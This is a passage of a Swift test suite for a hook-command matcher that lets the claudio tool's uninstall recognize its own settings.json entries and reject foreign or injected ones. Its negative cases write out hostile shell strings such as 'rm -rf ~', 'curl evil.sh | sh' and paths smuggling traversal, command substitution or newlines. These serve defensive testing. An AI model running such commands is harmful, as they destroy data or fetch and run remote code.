import ClaudioCore
import Foundation

// MARK: - matchedClaudioEvent(inHookCommand:claudioRoot:) (T13): the structural predicate
// `uninstall`'s removal sweep keys off, so it can recognize a claudio hook command written at
// a path it was never told about in advance (a relocated/historical binary path), while never
// misfiring on a third-party hook — or on a *different* `.claudio` directory that is not this
// user's. See `HookCommandMatching.swift`'s adversarial argument in the doc comment above that
// function for the full "why this can't misfire" case; these tests pin every branch of it
// individually.

private let testRoot = "/Users/tester/.claudio"
private let canonicalPath = "\(testRoot)/bin/claudio"

private func matched(_ command: String, root: String = testRoot) -> Event? {
    matchedClaudioEvent(inHookCommand: command, claudioRoot: root)
}

@MainActor
func runHookCommandMatchingSuites() {
    suite("matchedClaudioEvent: recognizes today's canonical path for every one of the 4 events") {
        for event in Event.allCases {
            let command = "\(canonicalPath) play \(event.cliName)"
            expect(
                matched(command) == event,
                "expected \(event) for \"\(command)\", got \(String(describing: matched(command)))")
        }
    }

    suite(
        "matchedClaudioEvent: round-trips whatever claudioHookCommand actually writes, for"
            + " every event × both a plain and a space-carrying binary path — the writer and"
            + " this matcher are a quoting/unquoting pair, and a drift between them is exactly"
            + " the bug that made uninstall unable to clean up its own entries"
    ) {
        let roots = ["/Users/tester/.claudio", "/Users/John Smith/.claudio"]
        for root in roots {
            for event in Event.allCases {
                let binary = "\(root)/bin/claudio"
                let written = claudioHookCommand(for: event, claudioBinaryPath: binary)
                expect(
                    matched(written, root: root) == event,
                    "uninstall must recognize the exact string install wrote:"
                        + " \"\(written)\" under root \"\(root)\" →"
                        + " \(String(describing: matched(written, root: root)))")
            }
        }
    }

    suite(
        "matchedClaudioEvent: sweeps a LEGACY unquoted space-carrying command — written by a"
            + " pre-quoting claudio, never runnable (the shell split it), but unambiguously"
            + " ours, so uninstall must still be able to remove it"
    ) {
        let spacedRoot = "/Users/John Smith/.claudio"
        let legacy = "/Users/John Smith/.claudio/bin/claudio play stop"
        expect(
            matched(legacy, root: spacedRoot) == .stop,
            "a legacy bare space-carrying command must still match, got"
                + " \(String(describing: matched(legacy, root: spacedRoot)))")
    }

    suite(
        "matchedClaudioEvent: sweeps a LEGACY unquoted command whose home carries an APOSTROPHE."
            + " `'` is the character shellWordContents cannot round-trip out of a bare word: one"
            + " leaves the scan inside a quote, two are silently deleted. Both were removable"
            + " before the writer started quoting (exact string equality on main; whitespace"
            + " tokenizing in this file's first draft), so failing to sweep them is a regression,"
            + " not an unimplemented tolerance"
    ) {
        // One `'`: shellWordContents ends inSingleQuotes and returns nil.
        let oddRoot = "/Users/o'brien/.claudio"
        let oddLegacy = "/Users/o'brien/.claudio/bin/claudio play stop"
        expect(
            matched(oddLegacy, root: oddRoot) == .stop,
            "an unbalanced-quote legacy command must still match, got"
                + " \(String(describing: matched(oddLegacy, root: oddRoot)))")

        // Two `'`: shellWordContents *succeeds*, but strips them — `/Users/o'b'rien` decodes to
        // `/Users/obrien`, which is not prefixed by the real root. Pins that the matcher tries
        // the raw word too, rather than trusting a decode that happened to return non-nil.
        let evenRoot = "/Users/o'b'rien/.claudio"
        let evenLegacy = "/Users/o'b'rien/.claudio/bin/claudio play notification"
        expect(
            matched(evenLegacy, root: evenRoot) == .notification,
            "a lossily-decoded legacy command must still match its real root, got"
                + " \(String(describing: matched(evenLegacy, root: evenRoot)))")

        // The fallback must not widen the destructive surface: the raw word still has to be
        // literally prefixed by *our* root. Another user's apostrophe home stays untouched.
        expect(
            matched(oddLegacy) == nil,
            "the raw-word fallback must not match outside our own root, got"
                + " \(String(describing: matched(oddLegacy)))")
    }

    suite(
        "matchedClaudioEvent: sweeps a LEGACY unquoted command whose home carries a BACKSLASH."
            + " `\\` is the other character shellWordContents refuses (it only ever decodes the"
            + " `'\\''` idiom's), so a bare legacy path containing one used to strand an orphan"
            + " hook in settings.json that uninstall could never remove"
    ) {
        let root = "/Users/a\\b/.claudio"
        let legacy = "/Users/a\\b/.claudio/bin/claudio play stop"
        expect(
            matched(legacy, root: root) == .stop,
            "a legacy bare backslash-carrying command must still match, got"
                + " \(String(describing: matched(legacy, root: root)))")

        expect(
            matched(legacy) == nil,
            "the raw-word fallback must not match outside our own root, got"
                + " \(String(describing: matched(legacy)))")
    }

    suite(
        "matchedClaudioEvent: an apostrophe in the home directory round-trips through the"
            + " '\\'' single-quote idiom"
    ) {
        let root = "/Users/o'brien/.claudio"
        let written = claudioHookCommand(for: .stop, claudioBinaryPath: "\(root)/bin/claudio")
        expect(
            written == "'/Users/o'\\''brien/.claudio/bin/claudio' play stop",
            "premise: the writer emits the POSIX escape idiom, got \(written)")
        expect(
            matched(written, root: root) == .stop,
            "got \(String(describing: matched(written, root: root)))")
    }

    suite(
        "matchedClaudioEvent: rejects a claudio-shaped command under a DIFFERENT .claudio root"
            + " — /tmp, another user's home, a sibling dot-folder. `uninstall` takes no backup,"
            + " so 'some component is named .claudio' must never be mistaken for 'is OUR root'"
    ) {
        let foreignRoots = [
            "/tmp/.claudio/bin/claudio play stop",
            "/Users/someone-else/.claudio/bin/claudio play stop",
            "/Users/tester/project/.claudio/bin/claudio play notification",
            "/Users/tester/.claudio-backup/bin/claudio play stop",
        ]
        for command in foreignRoots {
            expect(
                matched(command) == nil,
                "\"\(command)\" is outside \(testRoot) and must never match, got"
                    + " \(String(describing: matched(command)))")
        }
    }

    suite(
        "matchedClaudioEvent: recognizes a RELOCATED binary path under a different"
            + " subdirectory of the SAME root — the load-bearing case T13 exists for (a future"
            + " release moving bin/ -> libexec/, or any other subpath)"
    ) {
        let relocated = "\(testRoot)/libexec/claudio play stop"
        expect(
            matched(relocated) == .stop,
            "a relocated-but-still-in-root path must still match, got"
                + " \(String(describing: matched(relocated)))")
    }

    suite(
        "matchedClaudioEvent: recognizes the binary living directly at the root (no"
            + " subdirectory at all) — namespace membership doesn't require any particular depth"
    ) {
        let atRoot = "\(testRoot)/claudio play notification"
        expect(matched(atRoot) == .notification, "got \(String(describing: matched(atRoot)))")
    }

    suite(
        "matchedClaudioEvent: rejects a basename mismatch — a DIFFERENT tool living inside our"
            + " own root is not claudio, even with the right trailing argv"
    ) {
        let lookalike = "\(testRoot)/bin/mytool play stop"
        expect(
            matched(lookalike) == nil,
            "a non-\"claudio\"-named binary must never match, got"
                + " \(String(describing: matched(lookalike)))")
    }

    suite(
        "matchedClaudioEvent: rejects a claudio-named binary OUTSIDE the namespace — the task's"
            + " own example of a user's unrelated tool"
    ) {
        for command in ["/usr/local/bin/claudio play stop", "/Users/tester/bin/claudio play stop"] {
            expect(
                matched(command) == nil,
                "\"\(command)\" must never match, got \(String(describing: matched(command)))")
        }
    }

    suite("matchedClaudioEvent: rejects `..` traversal that escapes the root") {
        // Being literally prefixed by the root is NOT the same fact as "resolves inside the
        // root". Each path below is prefixed by it, yet lexically resolves outside — so a
        // prefix check alone would hand uninstall (which takes no backup) an entry that is
        // provably not ours. Assert the escape is real via `standardizingPath` first, so this
        // test can never pass for the wrong reason if that premise ever changes.
        let escapes = [
            "/Users/tester/.claudio/../claudio": "/Users/tester/claudio",
            "/Users/tester/.claudio/bin/../../../usr/bin/claudio": "/Users/usr/bin/claudio",
        ]
        for (rawPath, expectedResolved) in escapes {
            expect(
                (rawPath as NSString).standardizingPath == expectedResolved,
                "premise: \(rawPath) must lexically resolve to \(expectedResolved), got"
                    + " \((rawPath as NSString).standardizingPath)")
            expect(
                matched("\(rawPath) play stop") == nil,
                "a `..`-traversing path resolving OUTSIDE the root must never match, got"
                    + " \(String(describing: matched("\(rawPath) play stop")))")
        }

        // Guard the conservative direction explicitly: `..` is rejected even when the path
        // would still resolve inside the root. claudio has never written a `..`, so refusing
        // to sweep it leaves a harmless leftover rather than risking a wrong delete.
        let staysInside = "\(testRoot)/bin/../bin/claudio play stop"
        expect(
            matched(staysInside) == nil,
            "any `..` component is rejected outright (fail-closed), got"
                + " \(String(describing: matched(staysInside)))")
    }

    suite(
        "matchedClaudioEvent: rejects a QUOTE-HIDDEN `..` — a component that is not literally"
            + " `..` but whose /bin/sh quote-removal yields one, so argv[0] resolves OUTSIDE the"
            + " root. The raw-word fallback must not let quoting smuggle a traversal past the `..`"
            + " guard (both the raw candidate AND a lossy decode are checked, so both must fail)"
    ) {
        // Each below-root component would quote-remove to `..`; the shell then execs
        // `/Users/tester/bin/claudio` (or deeper), outside `testRoot`. Premise-checked so this
        // can never pass for the wrong reason: the quote-stripped form really is a `..` escape.
        let hidden = [
            "\(testRoot)/'..'/bin/claudio play stop",
            "\(testRoot)/\"..\"/bin/claudio play stop",
            "\(testRoot)/..''/bin/claudio play stop",
            "\(testRoot)/''..''/bin/claudio play stop",
            "\(testRoot)/\\.\\./bin/claudio play stop",
        ]
        for command in hidden {
            expect(
                matched(command) == nil,
                "a quote/backslash-hidden `..` must never match, got"
                    + " \(String(describing: matched(command))) for \"\(command)\"")
        }

        // Non-widening guard: a metacharacter in the HOME segment (above the root) is fine — a
        // legacy bare entry under an apostrophe home still sweeps. Only *below-root*
        // metacharacters are rejected, so the fix cannot have over-corrected into refusing R4.
        let apostropheHome = "/Users/o'brien/.claudio"
        expect(
            matched("\(apostropheHome)/bin/claudio play stop", root: apostropheHome) == .stop,
            "a metachar in the HOME segment must not block a legitimate legacy sweep")
    }

    suite(
        "matchedClaudioEvent: rejects a COMMAND SUBSTITUTION / variable below the root —"
            + " `$(…)`, backticks, `$VAR`. The decoder strips neither, so the decoded candidate is"
            + " no safer than the raw one; /bin/sh would expand these and exec an out-of-root"
            + " binary. claudio never writes a `$` or backtick below its own root"
    ) {
        let substitutions = [
            "\(testRoot)/$(echo ..)/claudio play stop",
            "\(testRoot)/`echo ..`/bin/claudio play stop",
            "\(testRoot)/$X/bin/claudio play stop",
        ]
        for command in substitutions {
            expect(
                matched(command) == nil,
                "a command substitution / variable below the root must never match, got"
                    + " \(String(describing: matched(command))) for \"\(command)\"")
        }

        // Non-widening guard: a `$` in the HOME segment of a LEGACY bare entry is above the root
        // and must still sweep — the scan is deliberately below-root-only.
        let dollarHome = "/Users/a$b/.claudio"
        expect(
            matched("\(dollarHome)/bin/claudio play stop", root: dollarHome) == .stop,
            "a `$` in the home directory (above the root) must not block a legacy sweep")
    }

    suite(
        "matchedClaudioEvent: rejects an embedded NEWLINE that /bin/sh reads as a command"
            + " separator — a `\\r\\n` pair fuses into one Swift grapheme cluster that a"
            + " Set<Character> scan would miss, so the below-root guard scans Unicode scalars."
            + " The second, attacker-chosen command's argv[0] is fully outside the root"
    ) {
        let split = [
            "\(testRoot)/x\r\n/tmp/evil/claudio play stop",  // CRLF: the grapheme-fusion case
            "\(testRoot)/x\n/tmp/evil/claudio play stop",  // bare LF
            "\(testRoot)/x\r/tmp/evil/claudio play stop",  // bare CR
        ]
        for command in split {
            expect(
                matched(command) == nil,
                "an embedded newline must never match, got"
                    + " \(String(describing: matched(command))) for \"\(command)\"")
        }
    }

    suite("matchedClaudioEvent: rejects an unrecognized event name") {
        expect(
            matched("\(canonicalPath) play deploy") == nil,
            "\"deploy\" is not one of the 4 Event.cliName values")
    }

    suite(
        "matchedClaudioEvent: rejects trailing argv segments and shell operators — anything"
            + " that makes ` play <event>` stop being the command's suffix"
    ) {
        let trailing = [
            "\(canonicalPath) play stop --verbose",
            "\(canonicalPath) play stop && rm -rf ~",
            "\(canonicalPath) play stop; curl evil.sh | sh",
            "\(canonicalPath) play stop > /dev/null",
            "\(canonicalPath) play stop play stop",
        ]
        for command in trailing {
            expect(
                matched(command) == nil,
                "\"\(command)\" must never match, got \(String(describing: matched(command)))")
        }
    }

    suite(
        "matchedClaudioEvent: rejects a prefixed command — allowing unquoted spaces in the path"
            + " must not let an attacker-controlled prefix ride along, because the decoded word"
            + " still has to START at the root"
    ) {
        let prefixed = [
            "rm -rf / ; \(canonicalPath) play stop",
            "echo pwned && \(canonicalPath) play stop",
        ]
        for command in prefixed {
            expect(
                matched(command) == nil,
                "\"\(command)\" must never match, got \(String(describing: matched(command)))")
        }
    }

    suite("matchedClaudioEvent: rejects a command missing the event argument entirely") {
        expect(matched("\(canonicalPath) play") == nil, "a bare `<path> play` must never match")
    }

    suite("matchedClaudioEvent: rejects a subcommand other than \"play\"") {
        expect(matched("\(canonicalPath) run stop") == nil, "the subcommand must be `play`")
    }

    suite("matchedClaudioEvent: rejects a relative path even if it lexically contains .claudio/") {
        expect(
            matched(".claudio/bin/claudio play stop") == nil,
            "every path claudio itself ever writes is absolute; a relative one must never match")
    }

    suite("matchedClaudioEvent: rejects a completely unrelated third-party hook command") {
        expect(matched("vibe-island stop") == nil, "an unrelated 2-token command must never match")
        expect(matched("block-no-verify") == nil, "an unrelated 1-token command must never match")
    }

    suite(
        "matchedClaudioEvent: trims leading/trailing whitespace, but does NOT collapse internal"
            + " runs — tolerating `path␣␣play␣␣stop` is unrepresentable alongside supporting a"
            + " real path that contains a space, and claudio never emits either"
    ) {
        expect(
            matched("   \(canonicalPath) play stop   ") == .stop,
            "leading/trailing whitespace cannot be part of a path claudio wrote, so it is"
                + " trimmed, got \(String(describing: matched("   \(canonicalPath) play stop   ")))")
        expect(
            matched("\(canonicalPath)   play   stop") == nil,
            "internal whitespace runs are no longer collapsed (fail-closed), got"
                + " \(String(describing: matched("\(canonicalPath)   play   stop")))")
    }

    suite(
        "matchedClaudioEvent: does NOT expand $HOME — a variable-relative form is not prefixed"
            + " by the resolved root and safely falls through as \"not ours\" (documented"
            + " limitation, not a bug)"
    ) {
        expect(
            matched("$HOME/.claudio/bin/claudio play stop") == nil,
            "no shell expansion is performed")
    }

    suite(
        "matchedClaudioEvent: does NOT strip double quotes — shellQuotedPath emits single"
            + " quotes only, so accepting a double-quoted form would widen the destructive"
            + " match surface for a shape we have never produced"
    ) {
        expect(
            matched("\"\(canonicalPath)\" play stop") == nil,
            "a double-quoted path must not match")
    }

    suite("matchedClaudioEvent: rejects an unterminated single quote") {
        expect(matched("'\(canonicalPath) play stop") == nil, "an unterminated quote must not match")
    }

    suite("matchedClaudioEvent: rejects an empty command string, and an empty root") {
        expect(matched("") == nil, "an empty string must never match")
        expect(
            matched("\(canonicalPath) play stop", root: "") == nil,
            "an empty root must never match anything")
        expect(
            matched("\(canonicalPath) play stop", root: "\(testRoot)/") == nil,
            "a trailing-slash root is rejected rather than silently normalized")
    }

    // MARK: - shellQuotedPath: the writer-side half of the pair

    suite(
        "shellQuotedPath: is the identity function for every path that already works unquoted"
            + " — including non-ASCII — so an upgraded claudio still recognizes its own"
            + " previously-installed hook instead of appending a duplicate"
    ) {
        let unchanged = [
            "/Users/tester/.claudio/bin/claudio",
            "/Users/张三/.claudio/bin/claudio",
            "/Users/a.b-c_d/.claudio/bin/claudio",
            "/Users/tester/.claudio/bin/claudio+1",
        ]
        for path in unchanged {
            expect(
                shellQuotedPath(path) == path,
                "\(path) is already shell-word-safe and must be emitted verbatim, got"
                    + " \(shellQuotedPath(path))")
        }
    }

    suite("shellQuotedPath: quotes exactly the characters that break an unquoted /bin/sh word") {
        let quoted = [
            "/Users/John Smith/.claudio/bin/claudio",
            "/Users/a$b/.claudio/bin/claudio",
            "/Users/a`b/.claudio/bin/claudio",
            "/Users/a*b/.claudio/bin/claudio",
            "/Users/a?b/.claudio/bin/claudio",
            "/Users/a[b/.claudio/bin/claudio",
            // Brace expansion fires on `a{c,d}e` even in POSIX-mode bash, so an unquoted
            // brace-carrying path makes the hook silently exec a path that does not exist.
            "/Users/a{c,d}e/.claudio/bin/claudio",
            "/Users/a;b/.claudio/bin/claudio",
            "/Users/a|b/.claudio/bin/claudio",
            "/Users/a&b/.claudio/bin/claudio",
            "/Users/a>b/.claudio/bin/claudio",
            "/Users/a\nb/.claudio/bin/claudio",
        ]
        for path in quoted {
            expect(
                shellQuotedPath(path).hasPrefix("'") && shellQuotedPath(path).hasSuffix("'"),
                "\(path) would be split, globbed or brace-expanded unquoted and must be quoted,"
                    + " got \(shellQuotedPath(path))")
        }
        expect(shellQuotedPath("") == "''", "the empty word must quote to '', got \(shellQuotedPath(""))")
    }

    suite(
        "shellQuotedPath: a REAL /bin/sh -c execs the intended binary — the unquoted form of a"
            + " glob-carrying path executes a DIFFERENT one, which is why * ? [ are unsafe even"
            + " though an unquoted glob with no sibling match looks like it works"
    ) {
        withTempDirectory { root in
            // Two siblings. The glob `a*b` matches both; the shell picks the first in sort
            // order, which is `a!b` — NOT the directory the path actually names.
            let decoy = root.appendingPathComponent("a!b")
            let real = root.appendingPathComponent("a*b")
            for directory in [decoy, real] {
                try? FileManager.default.createDirectory(
                    at: directory, withIntermediateDirectories: true)
                let script = directory.appendingPathComponent("claudio")
                writeFixture("#!/bin/sh\necho \"$0\"\n", to: script)
                try? FileManager.default.setAttributes(
                    [.posixPermissions: 0o755], ofItemAtPath: script.path)
            }
            let target = real.appendingPathComponent("claudio").path
            let runner = SystemCommandRunner()

            let bare = runner.run(
                executablePath: "/bin/sh", arguments: ["-c", target], timeout: 5.0)
            let quoted = runner.run(
                executablePath: "/bin/sh", arguments: ["-c", shellQuotedPath(target)], timeout: 5.0)

            guard case .completed(_, let bareOut) = bare, case .completed(_, let quotedOut) = quoted
            else {
                expect(false, "premise: both invocations must complete, got \(bare) / \(quoted)")
                return
            }
            expect(
                bareOut.trimmingCharacters(in: .whitespacesAndNewlines)
                    == decoy.appendingPathComponent("claudio").path,
                "premise: unquoted, the glob must run the DECOY binary — that is the bug being"
                    + " fixed. got \(bareOut)")
            expect(
                quotedOut.trimmingCharacters(in: .whitespacesAndNewlines) == target,
                "quoted, /bin/sh must exec exactly the path we named, got \(quotedOut)")
        }
    }

    suite(
        "shellQuotedPath: decides on Unicode SCALARS, not Characters — a metacharacter fused with"
            + " a following combining mark (or a CR+LF pair) is ONE Character equal to no member of"
            + " the unsafe set, while /bin/sh still reads the underlying byte and mangles the word"
    ) {
        // Each row: a path whose only unsafe scalar is invisible at Character granularity, and the
        // damage `/bin/sh` does to it unquoted. A `Character`-level scan emitted every one of these
        // verbatim — the glob row then execs a *different binary* (pinned live, next suite).
        let fused: [(path: String, scalar: Unicode.Scalar, damage: String)] = [
            ("/Users/a*\u{0301}b/.claudio/bin/claudio", "*", "globs, and execs a different binary"),
            ("/Users/a`\u{0301}b/.claudio/bin/claudio", "`", "unterminated command substitution"),
            ("/Users/a'\u{0301}b/.claudio/bin/claudio", "'", "breaks the writer's own '\\'' escape"),
            ("/Users/a\r\nb/.claudio/bin/claudio", "\r", "CR+LF splits the command in two"),
        ]
        for (path, scalar, damage) in fused {
            expect(
                path.unicodeScalars.contains(scalar),
                "premise: \(path.debugDescription) must really carry the \(scalar.debugDescription)"
                    + " scalar — otherwise this row pins nothing")
            expect(
                !path.contains(Character(scalar)),
                "premise: \(scalar.debugDescription) must be INVISIBLE at Character granularity in"
                    + " \(path.debugDescription) — that fusion is the whole bug; if this fails the"
                    + " row would pass for the wrong reason")
            expect(
                shellQuotedPath(path).hasPrefix("'") && shellQuotedPath(path).hasSuffix("'"),
                "unquoted, /bin/sh \(damage): \(path.debugDescription) must be quoted, got"
                    + " \(shellQuotedPath(path).debugDescription)")
        }
    }

    suite(
        "shellQuotedPath: a REAL /bin/sh execs the intended binary even when the glob character is"
            + " fused with a combining mark — the Character-level scan left this path unquoted, so"
            + " the hook silently ran a DIFFERENT program under a sibling directory"
    ) {
        withTempDirectory { root in
            // `a!<U+0301>b` sorts before `a*<U+0301>b` (0x21 < 0x2A), so the glob `a*<U+0301>b`
            // expands to the decoy first and /bin/sh execs *that*.
            let decoyPath = root.path + "/a!\u{0301}b"
            let realPath = root.path + "/a*\u{0301}b"
            for directory in [decoyPath, realPath] {
                try? FileManager.default.createDirectory(
                    atPath: directory, withIntermediateDirectories: true)
                let script = directory + "/claudio"
                writeFixture("#!/bin/sh\necho \"$0\"\n", to: URL(fileURLWithPath: script))
                try? FileManager.default.setAttributes(
                    [.posixPermissions: 0o755], ofItemAtPath: script)
            }
            let target = realPath + "/claudio"
            let runner = SystemCommandRunner()

            let bare = runner.run(
                executablePath: "/bin/sh", arguments: ["-c", target], timeout: 5.0)
            let quoted = runner.run(
                executablePath: "/bin/sh", arguments: ["-c", shellQuotedPath(target)], timeout: 5.0)

            guard case .completed(_, let bareOut) = bare, case .completed(_, let quotedOut) = quoted
            else {
                expect(false, "premise: both invocations must complete, got \(bare) / \(quoted)")
                return
            }
            expect(
                bareOut.trimmingCharacters(in: .whitespacesAndNewlines) == decoyPath + "/claudio",
                "premise: unquoted, the fused glob must run the DECOY binary — that is the bug being"
                    + " fixed, and if the shell did not glob here the next assertion proves nothing."
                    + " got \(bareOut)")
            expect(
                quotedOut.trimmingCharacters(in: .whitespacesAndNewlines) == target,
                "quoted, /bin/sh must exec exactly the path we named, got \(quotedOut)")
        }
    }

    suite(
        "claudioHookCommand → matchedClaudioEvent round-trips a path whose metacharacter is fused"
            + " with a combining mark: the writer quotes it on scalars and the decoder unquotes it"
            + " on scalars, so uninstall can still sweep the entry install just wrote"
    ) {
        let roots = [
            "/Users/a*\u{0301}b/.claudio",
            "/Users/a'\u{0301}b/.claudio",  // the `'\''` escape only balances on scalars
            "/Users/a\r\nb/.claudio",
        ]
        for root in roots {
            let binary = "\(root)/bin/claudio"
            expect(
                !binaryPathContradictsItsNamespace(binary),
                "premise: install must accept \(binary.debugDescription) — if it refused, the"
                    + " round-trip below would be vacuous")
            for event in Event.allCases {
                let written = claudioHookCommand(for: event, claudioBinaryPath: binary)
                expect(
                    matchedClaudioEvent(inHookCommand: written, claudioRoot: root) == event,
                    "uninstall must recognize the entry install wrote for \(event) at"
                        + " \(binary.debugDescription), got"
                        + " \(String(describing: matchedClaudioEvent(inHookCommand: written, claudioRoot: root)))"
                )
            }
        }
    }

    suite(
        "shellWordContents (via the matcher): rejects a backslash escaping anything but a single"
            + " quote — shellQuotedPath emits no other backslash, so accepting one would widen"
            + " the destructive match surface for a shape we never produced"
    ) {
        expect(
            matched("\(testRoot)/bin/cl\\audio play stop") == nil,
            "a stray backslash must not decode, got"
                + " \(String(describing: matched("\(testRoot)/bin/cl\\audio play stop")))")
        expect(
            matched("\(testRoot)/bin/claudio\\ play stop") == nil,
            "a trailing backslash before a space must not decode")
    }

    // MARK: - claudioNamespaceRoot: how uninstall learns which root to anchor to

    suite("claudioNamespaceRoot: derives the root from any binary path inside it") {
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/bin/claudio") == testRoot,
            "got \(String(describing: claudioNamespaceRoot(forBinaryPath: canonicalPath)))")
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/libexec/claudio")
                == testRoot,
            "a relocated binary still names the same root")
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/John Smith/.claudio/bin/claudio")
                == "/Users/John Smith/.claudio",
            "a space in the home directory must not break root derivation")
    }

    suite(
        "claudioNamespaceRoot: anchors to the FIRST .claudio component, not the last — a nested"
            + " `.claudio/.claudio` must resolve to the outer root, so uninstall's sweep still"
            + " covers everything the installation owns rather than one sub-branch of it"
    ) {
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/.claudio/bin/claudio")
                == "/Users/tester/.claudio",
            "got \(String(describing: claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/.claudio/bin/claudio")))"
        )
        // And the consequence the choice exists for: an entry in the OUTER root still matches
        // when the binary we were handed lives in the inner one.
        let outerEntry = "/Users/tester/.claudio/bin/claudio play stop"
        let derived = claudioNamespaceRoot(
            forBinaryPath: "/Users/tester/.claudio/.claudio/bin/claudio")!
        expect(
            matchedClaudioEvent(inHookCommand: outerEntry, claudioRoot: derived) == .stop,
            "lastIndex-of would anchor to the inner root and strand the outer entry")
    }

    suite("claudioNamespaceRoot: is fail-closed — nil for anything that names no root") {
        let noRoot = [
            "/usr/local/bin/claudio",
            ".claudio/bin/claudio",
            "/Users/tester/.claudio/../claudio",
            "",
        ]
        for path in noRoot {
            expect(
                claudioNamespaceRoot(forBinaryPath: path) == nil,
                "\(path) names no usable root and must yield nil, got"
                    + " \(String(describing: claudioNamespaceRoot(forBinaryPath: path)))")
        }
    }

    suite(
        "claudioNamespaceRoot: production's real binary path always names a root — the"
            + " fail-closed nil branch is unreachable outside a hand-passed path"
    ) {
        expect(
            claudioNamespaceRoot(forBinaryPath: ClaudioPaths.claudioBinary.path)
                == ClaudioPaths.root.path,
            "the derived root must equal ClaudioPaths.root, got"
                + " \(String(describing: claudioNamespaceRoot(forBinaryPath: ClaudioPaths.claudioBinary.path)))"
        )
    }

    suite(
        "matchedClaudioEvent: the root gate compares Unicode SCALARS, not Characters. Swift's"
            + " String equality is canonical equivalence, so a `hasPrefix` gate answers TRUE for"
            + " an NFC-spelled command under an NFD-spelled root even though the two are not the"
            + " same bytes. On a normalization-INsensitive volume (APFS) they name one directory;"
            + " on a normalization-sensitive home (NFS/SMB — the AD-account case) they are two,"
            + " and sweeping across them deletes a settings.json hook out of a root that is not"
            + " ours, from a file uninstall takes no backup of"
    ) {
        let nfdRoot = "/Users/e\u{301}/.claudio"  // "e" + COMBINING ACUTE ACCENT
        let nfcRoot = "/Users/\u{00E9}/.claudio"  // precomposed "é" (U+00E9)
        expect(
            !nfdRoot.unicodeScalars.elementsEqual(nfcRoot.unicodeScalars),
            "sanity: the two spellings must be different scalar sequences")
        expect(
            nfdRoot == nfcRoot,
            "sanity: ...yet Swift's String == calls them equal. That is the whole trap: a"
                + " String/Character-level prefix gate cannot tell these apart")

        // The bug this gate exists to stop: canonically equivalent, byte-different.
        expect(
            matched("\(nfcRoot)/bin/claudio play stop", root: nfdRoot) == nil,
            "an NFC-spelled command under an NFD-spelled root must NOT match")
        expect(
            matched("\(nfdRoot)/bin/claudio play stop", root: nfcRoot) == nil,
            "an NFD-spelled command under an NFC-spelled root must NOT match")

        // ...while each spelling still sweeps its own entry, so a non-ASCII home is not bricked.
        for root in [nfdRoot, nfcRoot] {
            expect(
                matched("\(root)/bin/claudio play stop", root: root) == .stop,
                "a non-ASCII home must still sweep its own entry, root \(root)")
        }
    }

    suite(
        "matchedClaudioEvent: slices the same view it compared. A combining mark right after the"
            + " root's trailing `/` fuses with it into ONE grapheme cluster, so a Character-level"
            + " `dropFirst(root.count + 1)` would eat the mark along with the slash — slicing a"
            + " different view than the prefix was checked on. On scalars the mark survives into"
            + " the below-root scan, where it belongs: it names a real subdirectory INSIDE our own"
            + " root, carries no metacharacter, and sweeping it is the job"
    ) {
        expect(
            matched("\(testRoot)/\u{301}bin/claudio play stop") == .stop,
            "a combining mark below the root names a subdirectory of ours and must still sweep")
        // But it is scanned, not swallowed: a metacharacter behind it is still caught.
        expect(
            matched("\(testRoot)/\u{301}$X/claudio play stop") == nil,
            "a metacharacter after a leading combining mark must still be rejected")
        // And it can never fake the basename: `\u{301}claudio` is not `claudio`.
        expect(
            matched("\(testRoot)/bin/\u{301}claudio play stop") == nil,
            "a combining mark must not let a different basename pass as `claudio`")
        // Same at the TRAILING edge: `claudio` + a combining mark is one scalar longer than the
        // literal, so the scalar `elementsEqual` basename check rejects it — a Character-level
        // check that folded the mark into the last grapheme could have waved it through.
        expect(
            matched("\(testRoot)/bin/claudio\u{301} play stop") == nil,
            "a trailing combining mark must not let `claudioX` pass as the basename `claudio`")
        // And a combining mark on the root's OWN final character makes a *sibling* directory:
        // `<root>` + U+0301 is not scalar-prefixed by `<root>/`, so it is outside the root, the
        // same way `.claudio-backup` is. The trailing-slash + scalar-exact prefix guard catches it.
        expect(
            matched("\(testRoot)\u{301}x/bin/claudio play stop", root: testRoot) == nil,
            "a combining mark on the root's final char names a sibling dir, not our root")
    }

    suite(
        "binaryPathContradictsItsNamespace: install's writer-side guard. shellQuotedPath will"
            + " quote ANY path into one valid /bin/sh word, but matchedClaudioEvent refuses a"
            + " below-root metacharacter or a basename that is not `claudio` — so a path inside a"
            + " .claudio namespace must be a shape that namespace's own sweep matches back out,"
            + " or install would append an entry no uninstall could ever remove"
    ) {
        let sweepable = [
            "\(testRoot)/bin/claudio",  // today's canonical path
            "\(testRoot)/libexec/claudio",  // a future relocation
            "\(testRoot)/claudio",  // the root itself
            "/Users/John Smith/.claudio/bin/claudio",  // space ABOVE the root
            "/Users/o'brien/.claudio/bin/claudio",  // quote ABOVE the root
            "/Users/a$b/.claudio/bin/claudio",  // `$` ABOVE the root
            "/Users/张三/.claudio/bin/claudio",  // non-ASCII home
            ClaudioPaths.claudioBinary.path,  // the real production path
        ]
        for path in sweepable {
            expect(
                !binaryPathContradictsItsNamespace(path),
                "\(path) is sweepable and install must accept it")
        }

        let unsweepable = [
            "\(testRoot)/lib exec/claudio",  // space BELOW the root
            "\(testRoot)/bin/claudio-helper",  // basename is not exactly `claudio`
            "\(testRoot)/$X/claudio",  // variable BELOW the root
            "\(testRoot)/'..'/bin/claudio",  // quote-hidden traversal
            "\(testRoot)/$(echo x)/claudio",  // command substitution BELOW the root
            "\(testRoot)/`echo x`/bin/claudio",  // backtick substitution BELOW the root
            "\(testRoot)/x\n/claudio",  // embedded NEWLINE below the root
        ]
        for path in unsweepable {
            expect(
                binaryPathContradictsItsNamespace(path),
                "\(path) could never be swept back out; install must refuse it")
            // The exact asymmetry the guard exists for: the writer WOULD emit a command for it...
            let written = claudioHookCommand(for: .stop, claudioBinaryPath: path)
            let derivedRoot = claudioNamespaceRoot(forBinaryPath: path)
            expect(derivedRoot != nil, "sanity: \(path) does name a namespace")
            // ...which this matcher then refuses, stranding the entry in settings.json forever.
            expect(
                matchedClaudioEvent(inHookCommand: written, claudioRoot: derivedRoot ?? "") == nil,
                "the guard's premise: \"\(written)\" is unmatchable, so it must never be written")
        }
    }

    suite(
        "binaryPathContradictsItsNamespace: a path naming NO .claudio namespace is not a"
            + " contradiction. claudioNamespaceRoot yields nil for it, so uninstall fail-closes and"
